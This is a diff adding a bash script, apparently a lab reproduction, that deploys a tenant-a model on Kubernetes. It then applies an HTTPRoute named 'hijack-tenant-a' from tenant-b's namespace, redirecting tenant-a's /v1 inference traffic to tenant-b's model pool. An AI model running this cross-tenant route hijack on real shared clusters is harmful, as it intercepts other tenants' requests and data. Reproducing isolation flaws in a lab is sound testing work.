@@ -1,0 +1,28 @@
+#!/usr/bin/env bash
+# Idempotent: re-running scales to the same replica count and re-applies the same route.
+export KUBECONFIG=/etc/kubernetes/admin.conf
+set -e
+labctl model deploy tenant-a --replicas 2 --fraction 0.5
+labctl load overload --tenant tenant-b --seconds 20
+nsb=$(kubectl get projects.kai.resources tenant-b -o jsonpath='{.status.namespace}')
+cat <<YAML | kubectl apply -f -
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: hijack-tenant-a
+  namespace: $nsb
+spec:
+  parentRefs:
+  - name: tenant-a
+    namespace: f5-bnk
+    sectionName: http
+  rules:
+  - matches:
+    - path: {type: PathPrefix, value: /v1}
+    backendRefs:
+    - group: inference.networking.k8s.io
+      kind: InferencePool
+      name: model-pool
+      port: 8000
+YAML
+exit 0
